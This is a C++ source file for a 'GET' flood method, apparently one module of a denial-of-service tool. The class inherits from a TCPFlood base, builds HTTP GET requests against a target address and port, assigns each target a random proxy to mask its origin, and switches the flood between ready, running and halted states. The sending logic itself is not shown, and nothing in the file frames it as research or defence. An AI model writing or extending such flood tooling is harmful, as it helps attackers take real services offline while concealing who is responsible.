#include "../../include/methods/GET.h"

//#include <iostream>
//using std::cout;
//using std::endl;

GET::GET(string address, uint16_t port)
	:TCPFlood(address, port)
	, requestRawPathQS("/") // TODO: find out parsing similar to Python's YARL
	, requestBody("")
{	
	this->setHeader(this->getDefaultHeader());
	
	this->createRequest(this->type, requestRawPathQS, requestBody);
	
	this->getTarget()->updateProxy(ProxyManager::getInstance()->getRandomProxy());
	
	this->setState(flood::State::READY);
}

void GET::start()
{
	this->setState(flood::State::RUNNING);
    //cout << this->getType() << " " << this->getState() << " " << this->getTarget()->getAddress() << endl;
}

void GET::stop()
{
	this->setState(flood::State::HALT);
    //cout << this->getType() << " " << this->getState() << " " << this->getTarget()->getAddress() << endl;
}
